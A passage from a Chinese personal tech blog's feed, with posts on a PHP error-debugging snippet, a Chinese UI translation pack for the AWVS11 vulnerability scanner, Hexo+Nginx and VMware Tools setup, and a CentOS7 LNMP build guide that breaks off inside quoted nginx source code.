        <content type="html"><![CDATA[<p>3个多月没发博文了 过一段时间把i春秋上的文章迁移下。。</p><span id="more"></span><p>最近在用PHP做课设 本地测试非常完美<br><img src="/images/HLUVsTT.png"><br>但是到了远程服务器就报500错误了。。<br><img src="/images/P9Q1dnF.png"><br>查了一番资料，发现了一个万能调试代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">error_get_last</span>()); </span><br><span class="line">&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这段直接加到出问题的主文件开头<br><img src="/images/kBzyP6w.png"><br>然后访问<br><img src="/images/GZdo3tU.png"><br>即可定位错误并解决</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汉化AWVS11</title>
      <link href="/p/4184734165.html"/>
      <url>/p/4184734165.html</url>
      
        <content type="html"><![CDATA[<p>AWVS11汉化包</p><span id="more"></span><p><strong>没注意AWVS11更新了2个版本了，试了下原先汉化的那个包，大部分不能用了，重新汉化了下</strong></p><h1 id="界面预览"><a href="#界面预览" class="headerlink" title="界面预览"></a>界面预览</h1><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="/images/M4zyhkv.png"></p><h2 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h2><p><img src="/images/CUblTHp.png"></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><img src="/images/wNNaTSW.png"></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="/images/DYNgm8m.png"></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p><img src="/images/K3vUPKi.png"></p><h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p><img src="/images/X1FXb5Y.png"></p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p><img src="/images/kJTMe5f.png"></p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol><li>下载</li><li>解压</li><li>复制到AWVS11的\ui\scripts目录下，覆盖原文件 [建议备份原文件]</li><li>如：AWVS11目录为<code>C:\Program Files (x86)\Acunetix 11\</code>则目标位置为<code>C:\Program Files (x86)\Acunetix 11\11.0.172901635\ui\scripts</code></li><li>如AWVS11运行中，请强制刷新AWVS11当前页</li></ol><h1 id="汉化说明"><a href="#汉化说明" class="headerlink" title="汉化说明"></a>汉化说明</h1><ol><li>全局UI界面重新做汉化，尽可能的保留原始意思</li><li>出于版权原因，漏洞说明不提供汉化</li><li>添加了github项目，使用过程中如有界面未做到汉化或更好的建议，请在本帖内反馈或到Github反馈，感谢</li><li>请勿用于非法用途，测试后请尽快删除。</li></ol><hr><h1 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h1><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/files/AWVS11.rar">AWVS11.rar</a></p>]]></content>
      
      
      <categories>
          
          <category> AWVS11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWVS11 </tag>
            
            <tag> 汉化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO+NGINX 部署教程</title>
      <link href="/p/2289482423.html"/>
      <url>/p/2289482423.html</url>
      
        <content type="html"><![CDATA[<p>应朋友要求，记录下HEXO+NGINX部署</p><span id="more"></span><h1 id="HEXO介绍"><a href="#HEXO介绍" class="headerlink" title="HEXO介绍"></a>HEXO介绍</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h1 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h1><p>Nginx （读“engine x”）是一款免费、开源、高性能的HTTP服务器。<br>Nginx 因性能稳定、功能丰富、配置简单、资源消耗低而著称。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>本次采用的环境：<br>Centos 7<br>Node.js 8.9.4</p><h1 id="Nginx部署"><a href="#Nginx部署" class="headerlink" title="Nginx部署"></a>Nginx部署</h1><p>参考博客的：<a href="https://0x20h.com/p/1782935252.html">Nginx部署</a></p><h1 id="Hexo部署"><a href="#Hexo部署" class="headerlink" title="Hexo部署"></a>Hexo部署</h1><h2 id="下载安装最新的node-js"><a href="#下载安装最新的node-js" class="headerlink" title="下载安装最新的node.js"></a>下载安装最新的node.js</h2><p><code>wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz</code></p><h3 id="解压并重命名"><a href="#解压并重命名" class="headerlink" title="解压并重命名"></a>解压并重命名</h3><p><code>tar xvf node-v8.9.4.tar.gz &amp;&amp; mv node-v8.9.4 node</code></p><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><h3 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cd node</span><br><span class="line">[root@www node]# ls</span><br><span class="line">AUTHORS      BUILDING.md   CODE_OF_CONDUCT.md     CONTRIBUTING.md     GOVERNANCE.md  Makefile   android-configure  common.gypi  deps  lib       node.gypi  test   vcbuild.bat</span><br><span class="line">BSDmakefile  CHANGELOG.md  COLLABORATOR_GUIDE.md  CPP_STYLE_GUIDE.md  LICENSE        README.md  benchmark          configure    doc   node.gyp  src        tools</span><br></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>这一步耗时较长，可以泡杯咖啡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www node]# ./configure --prefix=/usr/local/node/8.9.4 &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="配置NODE-HOME，进入profile编辑环境变量"><a href="#配置NODE-HOME，进入profile编辑环境变量" class="headerlink" title="配置NODE_HOME，进入profile编辑环境变量"></a>配置NODE_HOME，进入profile编辑环境变量</h3><p><code>vi /etc/profile</code><br>设置nodejs环境变量，在<em>export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL</em>一行的上面添加如下内容:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set for nodejs</span><br><span class="line">export NODE_HOME=/usr/local/node/8.9.4</span><br><span class="line">export PATH=$NODE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure><p>:wq保存并退出，编译<code>/etc/profile</code>使配置生效<br><code>source /etc/profile</code><br>验证是否安装配置成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line"></span><br><span class="line">[root@www node]# node -v</span><br><span class="line">v8.9.4</span><br></pre></td></tr></table></figure><p>npm模块安装路径<br><code>/usr/local/node/8.9.4/lib/node_modules/</code></p><p><strong>注：Nodejs 官网提供了编译好的Linux二进制包，你也可以下载下来直接应用。</strong></p><h2 id="下载hexo"><a href="#下载hexo" class="headerlink" title="下载hexo"></a>下载hexo</h2><p><code>[root@www ~]# npm install -g hexo-cli</code></p><h2 id="初始化HEXO"><a href="#初始化HEXO" class="headerlink" title="初始化HEXO"></a>初始化HEXO</h2><p>在<code>/home/wwwroot/domain</code>目录下初始化<code>hexo</code>博客，也可以是任意你想要的名字<br><code>[root@www domain]# hexo init /home/wwwroot/domain</code><br>进入博客根目录，并且安装相关插件依赖等<br><code>[root@www domain]cd /home/wwwroot/domain/blog</code><br><code>[root@www blog]# npm install</code><br>安装完成后需要用一下命令<br><code>[root@www blog] hexo g -d</code></p><h2 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h2><p><a href="https://0x20h.com/p/1782935252.html">Nginx部署</a><br>在虚拟主机配置的目录新建个<code>blog.conf</code>内容如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    #listen 443 spdy;</span><br><span class="line">    #listen [::]:443 spdy;</span><br><span class="line">    server_name blog.example.com;</span><br><span class="line">    index index.html index.php;</span><br><span class="line">    set $subdomain &#x27;&#x27;;</span><br><span class="line">    root  /home/wwwroot/domain/blog/public$subdomain;</span><br><span class="line">    #include /home/wwwroot/rewrite/xxx.conf;</span><br><span class="line">   </span><br><span class="line">    ### SSL 配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age=31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate /path/to/public.crt;</span><br><span class="line">    #ssl_certificate_key /path/to/private.key;</span><br><span class="line">    ############</span><br><span class="line">    #location ~ .*.php(/.*)*$</span><br><span class="line">    #&#123;</span><br><span class="line">    #    fastcgi_pass  unix:/tmp/php-cgi-www.example.com.sock;</span><br><span class="line">    #    fastcgi_index index.php;</span><br><span class="line">    #    include fastcgi.conf;</span><br><span class="line">    #    #fastcgi_param HTTPS $https if_not_empty;</span><br><span class="line">    #    fastcgi_param DOCUMENT_ROOT /home/wwwroot/domain/www.w3bsafe.cn$subdomain;</span><br><span class="line">    #    fastcgi_param SCRIPT_FILENAME  /home/wwwroot/domain/www.w3bsafe.cn$subdomain$fastcgi_script_name;</span><br><span class="line">    #&#125;</span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line">    access_log off;</span><br><span class="line">    error_log /dev/null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启nginx，访问你的域名即可</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机里的LINUX装VMTOOLS</title>
      <link href="/p/3201611950.html"/>
      <url>/p/3201611950.html</url>
      
        <content type="html"><![CDATA[<p>记录下虚拟机里的LINUX装VMTOOLS</p><span id="more"></span><h1 id="环境如下："><a href="#环境如下：" class="headerlink" title="环境如下："></a>环境如下：</h1><ul><li>Centos6</li><li>VM12.9</li></ul><h1 id="安装LINUX"><a href="#安装LINUX" class="headerlink" title="安装LINUX"></a>安装LINUX</h1><p><img src="/images/tu6BkmI.png"></p><p><img src="/images/GtCKgbF.png"></p><p><img src="/images/I9cGgYb.png"></p><p><img src="/images/Y6osn76.png"></p><p><img src="/images/R6KKW41.png"></p><p><img src="/images/BteHsqg.png"></p><h1 id="安装VMTOOLS"><a href="#安装VMTOOLS" class="headerlink" title="安装VMTOOLS"></a>安装VMTOOLS</h1><h2 id="以root用户登录"><a href="#以root用户登录" class="headerlink" title="以root用户登录"></a>以root用户登录</h2><p><img src="/images/iZu9q0H.png"></p><h2 id="警告消息"><a href="#警告消息" class="headerlink" title="警告消息"></a>警告消息</h2><p><img src="/images/7sQ5oyR.png"></p><h2 id="进入系统后会弹出以下界面"><a href="#进入系统后会弹出以下界面" class="headerlink" title="进入系统后会弹出以下界面"></a>进入系统后会弹出以下界面</h2><p><img src="/images/nCbsNhe.png"></p><h2 id="Copy-VMwareTools-tar-gz到桌面"><a href="#Copy-VMwareTools-tar-gz到桌面" class="headerlink" title="Copy VMwareTools.tar.gz到桌面"></a>Copy VMwareTools.tar.gz到桌面</h2><p><img src="/images/FHnvtLH.png"><br><img src="/images/uIXnEXL.png"><br><strong>为方便，改个名</strong><br><img src="/images/Iw1EONB.png"></p><h2 id="打开SEHLL终端"><a href="#打开SEHLL终端" class="headerlink" title="打开SEHLL终端"></a>打开SEHLL终端</h2><p><img src="/images/hFOSD9V.png"><br><img src="/images/iim4Tkz.png"></p><h2 id="cd到桌面"><a href="#cd到桌面" class="headerlink" title="cd到桌面"></a>cd到桌面</h2><p><img src="/images/AV31RIi.png"></p><h2 id="tar解压"><a href="#tar解压" class="headerlink" title="tar解压"></a>tar解压</h2><p>命令:<code>tar xvf tools.tar.gz</code><br>解压后如下<br><img src="/images/yXdQnEy.png"><br>桌面出现个文件夹<br><img src="/images/4mKbyvf.png"></p><h2 id="cd进入解压后的文件夹vmware-tools-distrib"><a href="#cd进入解压后的文件夹vmware-tools-distrib" class="headerlink" title="cd进入解压后的文件夹vmware-tools-distrib"></a>cd进入解压后的文件夹vmware-tools-distrib</h2><p><img src="/images/40JVxiR.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>执行安装脚本<code>./vmware-install.pl</code><br><img src="/images/SUQ9d8F.png"><br>一路回车</p><hr><h2 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h2><p><img src="/images/sGur5nI.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> VMWare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7部署LNMP</title>
      <link href="/p/1782935252.html"/>
      <url>/p/1782935252.html</url>
      
        <content type="html"><![CDATA[<p>记录下CentOS7下手动部署Nginx+MySQL+PHP的方法[附修改Nginx的Hearder名称]</p><span id="more"></span><p>介绍：</p><blockquote><p>Nginx （读“engine x”）是一款免费、开源、高性能的HTTP服务器。<br>Nginx 因性能稳定、功能丰富、配置简单、资源消耗低而著称。<br>本文介绍如何在Linux服务器（CentOS 7）上安装Nginx、MySQL和PHP7（或者PHP5），这个环境也简称LNMP或LEMP。<br>其中，Nginx和PHP的采用PHP-FPM方式通信。</p></blockquote><h1 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h1><p><code>[root@www ~]# yum -y update &amp;&amp; yum -y update</code></p><p><img src="/images/Y8zn28D.png"></p><h1 id="安装用到的工具"><a href="#安装用到的工具" class="headerlink" title="安装用到的工具"></a>安装用到的工具</h1><p>安装开发工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">yum -y update &amp;&amp; yum -y upgrade  //更新系统组件</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">yum install -y vim screen //安装实用工具</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">screen -S install //使用screen防止ssh链路故障导致后续的编译步骤中断</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">yum install -y gcc gcc-c++ make cmake libxml2 libxml2-devel openssl-devel bison bison-devel make autoconf automake curl-devel gcc zlib-devel openssl pcre-devel gd kernel keyutils patch perl kernel-headers compat* mpfr cpp glibc libgomp libstdc++-devel ppl cloog-ppl keyutils-libs-devel libcom_err-devel libsepol-devel libselinux-devel krb5-devel zlib-devel libXpm* freetype libjpeg* libpng* ncurses* libtool* libxml2 libxml2-devel freetype-devel --skip-broken</span> </span><br></pre></td></tr></table></figure><p><img src="/images/uHEauah.png"></p><h1 id="建立运行网站和数据库必要的用户和组"><a href="#建立运行网站和数据库必要的用户和组" class="headerlink" title="建立运行网站和数据库必要的用户和组"></a>建立运行网站和数据库必要的用户和组</h1><p>添加运行nginx服务进程的用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupadd -r nginx </span><br><span class="line">useradd -r -g nginx  nginx</span><br></pre></td></tr></table></figure><h1 id="建立安装临时目录"><a href="#建立安装临时目录" class="headerlink" title="建立安装临时目录"></a>建立安装临时目录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /make</span></span><br></pre></td></tr></table></figure><h2 id="下载源码包"><a href="#下载源码包" class="headerlink" title="下载源码包"></a>下载源码包</h2><p>【以下源码截至2018年11月9日均为最新】</p><blockquote><p>Nginx:<a href="http://nginx.org/en/download.html">http://nginx.org/en/download.html</a><br>PHP:<a href="http://php.net/downloads.php">http://php.net/downloads.php</a><br>MySQL-5.7：<a href="https://dev.mysql.com/get/Downloads/MySQL-5.7/">https://dev.mysql.com/get/Downloads/MySQL-5.7/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">wget http://nginx.org/download/nginx-1.15.6.tar.gz</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">wget http://au1.php.net/distributions/php-7.2.12.tar.gz</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.24-el7-x86_64.tar.gz</span></span><br></pre></td></tr></table></figure><h1 id="编译Nginx"><a href="#编译Nginx" class="headerlink" title="编译Nginx"></a>编译Nginx</h1><h2 id="安装-vim-和-unzip"><a href="#安装-vim-和-unzip" class="headerlink" title="安装 vim 和 unzip"></a>安装 vim 和 unzip</h2><p>下载软件用于编辑和解压缩文件。运行命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">yum install -y vim unzip</span></span><br></pre></td></tr></table></figure><h2 id="linux-终端颜色修改"><a href="#linux-终端颜色修改" class="headerlink" title="linux 终端颜色修改"></a>linux 终端颜色修改</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">yum install -y vim</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">vim ~/.bashrc</span></span><br><span class="line">  PS1=&quot;\[\e[36;40m\][\[\e[31;40m\]\h\[\e[33;40m\]@\[\e[32;40m\]\u\[\e[33;40m\]@\[\e[36;40m\]\w\[\e[33;40m\]@\[\e[35;40m\]\#\[\e[36;40m\]]\[\e[34;40m\]~$ \[\e[0m\]&quot;</span><br></pre></td></tr></table></figure><p>在PS1中设置字符颜色的格式为：<code>\[\e[F;Bm\]........\[\e[0m\]</code>，其中“F“为字体颜色，编号为30-37，“B”为背景颜色，编号为40-47,<code>\[\e[0m\]</code>作为颜色设定的结束。</p><p>颜色对照表：</p><table><thead><tr><th>F</th><th>B</th><th>color</th><th>备注</th></tr></thead><tbody><tr><td>30</td><td>40</td><td>黑色</td><td></td></tr><tr><td>31</td><td>41</td><td>红色</td><td></td></tr><tr><td>32</td><td>42</td><td>绿色</td><td></td></tr><tr><td>33</td><td>43</td><td>黄色</td><td></td></tr><tr><td>34</td><td>44</td><td>蓝色</td><td>在cmd里显示效果很差</td></tr><tr><td>35</td><td>45</td><td>紫红色</td><td>和powershell的紫色背景完全融为一体</td></tr><tr><td>36</td><td>46</td><td>青蓝色</td><td></td></tr><tr><td>37</td><td>47</td><td>白色</td><td></td></tr></tbody></table><p>要使用颜色只需将对应数字套入设置格式中即可。 比如要设置命令行的格式为绿字黑底(<code>\[\e[32;40m\]</code>)，显示当前用户的账号名称(\u)、主机的第一个名字(\h)、完整的当前工作目录名称(\w)、24小时格式时间(\t)。</p><h2 id="设置vim-行号"><a href="#设置vim-行号" class="headerlink" title="设置vim 行号"></a>设置vim 行号</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">vim   ~/.vimrc</span></span><br></pre></td></tr></table></figure><p>在里面输入 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nu</span><br></pre></td></tr></table></figure><p>下载完成后目录如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ ls</span><br><span class="line">php-7.2.12.tar.gz  nginx-1.15.6.tar.gz  mysql-5.7.24-el7-x86_64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="修改Nginx-编译"><a href="#修改Nginx-编译" class="headerlink" title="修改Nginx+编译"></a>修改Nginx+编译</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ tar zxvf nginx-1.15.6.tar.gz</span><br></pre></td></tr></table></figure><h2 id="以下为修改nginx名称和版本号步骤【无需要可跳过】"><a href="#以下为修改nginx名称和版本号步骤【无需要可跳过】" class="headerlink" title="以下为修改nginx名称和版本号步骤【无需要可跳过】"></a>以下为修改nginx名称和版本号步骤【无需要可跳过】</h2><p><strong>以下选做</strong></p><h3 id="nginx-h"><a href="#nginx-h" class="headerlink" title="nginx.h"></a>nginx.h</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ cd nginx-1.15.6/src/core</span><br><span class="line">[root@www core]$ vi nginx.h</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment"> * Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _NGINX_H_INCLUDED_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NGINX_H_INCLUDED_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> nginx_version      1013008</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGINX_VERSION      <span class="string">&quot;1.13.8&quot;</span> <span class="comment">//版本号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGINX_VER          <span class="string">&quot;nginx/&quot;</span> NGINX_VERSION <span class="comment">//Nginx名称</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NGX_BUILD</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGINX_VER_BUILD    NGINX_VER <span class="string">&quot; (&quot;</span> NGX_BUILD <span class="string">&quot;)&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGINX_VER_BUILD    NGINX_VER</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGINX_VAR          <span class="string">&quot;NGINX&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NGX_OLDPID_EXT     <span class="string">&quot;.oldbin&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _NGINX_H_INCLUDED_ */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ngx-http-header-filter-module-c"><a href="#ngx-http-header-filter-module-c" class="headerlink" title="ngx_http_header_filter_module.c"></a>ngx_http_header_filter_module.c</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www core]$ cd nginx-1.15.6/src/http</span><br><span class="line">[root@www http]$ vi ngx_http_header_filter_module.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment"> * Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_config.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_http.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;nginx.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ngx_int_t</span> <span class="title function_">ngx_http_header_filter_init</span><span class="params">(<span class="type">ngx_conf_t</span> *cf)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ngx_int_t</span> <span class="title function_">ngx_http_header_filter</span><span class="params">(<span class="type">ngx_http_request_t</span> *r)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ngx_http_module_t</span>  ngx_http_header_filter_module_ctx = &#123;</span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* preconfiguration */</span></span><br><span class="line">    ngx_http_header_filter_init,           <span class="comment">/* postconfiguration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create main configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init main configuration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create server configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* merge server configuration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create location configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* merge location configuration */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ngx_module_t</span>  ngx_http_header_filter_module = &#123;</span><br><span class="line">    NGX_MODULE_V1,</span><br><span class="line">    &amp;ngx_http_header_filter_module_ctx,    <span class="comment">/* module context */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* module directives */</span></span><br><span class="line">    NGX_HTTP_MODULE,                       <span class="comment">/* module type */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init master */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init module */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init process */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init thread */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit thread */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit process */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit master */</span></span><br><span class="line">    NGX_MODULE_V1_PADDING</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u_char ngx_http_server_string[] = <span class="string">&quot;Server: nginx&quot;</span> CRLF; <span class="comment">//改这里</span></span><br><span class="line"><span class="type">static</span> u_char ngx_http_server_full_string[] = <span class="string">&quot;Server: &quot;</span> NGINX_VER CRLF;</span><br><span class="line"><span class="type">static</span> u_char ngx_http_server_build_string[] = <span class="string">&quot;Server: &quot;</span> NGINX_VER_BUILD CRLF;</span><br><span class="line">………………………………</span><br></pre></td></tr></table></figure><h3 id="ngx-http-special-response-c"><a href="#ngx-http-special-response-c" class="headerlink" title="ngx_http_special_response.c"></a>ngx_http_special_response.c</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www http]$ vi ngx_http_special_response.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment">* Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_config.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ngx_http.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;nginx.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ngx_int_t</span> <span class="title function_">ngx_http_send_error_page</span><span class="params">(<span class="type">ngx_http_request_t</span> *r,</span></span><br><span class="line"><span class="params">    <span class="type">ngx_http_err_page_t</span> *err_page)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ngx_int_t</span> <span class="title function_">ngx_http_send_special_response</span><span class="params">(<span class="type">ngx_http_request_t</span> *r,</span></span><br><span class="line"><span class="params">    <span class="type">ngx_http_core_loc_conf_t</span> *clcf, <span class="type">ngx_uint_t</span> err)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ngx_int_t</span> <span class="title function_">ngx_http_send_refresh</span><span class="params">(<span class="type">ngx_http_request_t</span> *r)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u_char ngx_http_error_full_tail[] =</span><br><span class="line"><span class="string">&quot;&lt;hr&gt;&lt;center&gt;&quot;</span> NGINX_VER <span class="string">&quot;&lt;/center&gt;&quot;</span> CRLF</span><br><span class="line"><span class="string">&quot;&lt;/body&gt;&quot;</span> CRLF</span><br><span class="line"><span class="string">&quot;&lt;/html&gt;&quot;</span> 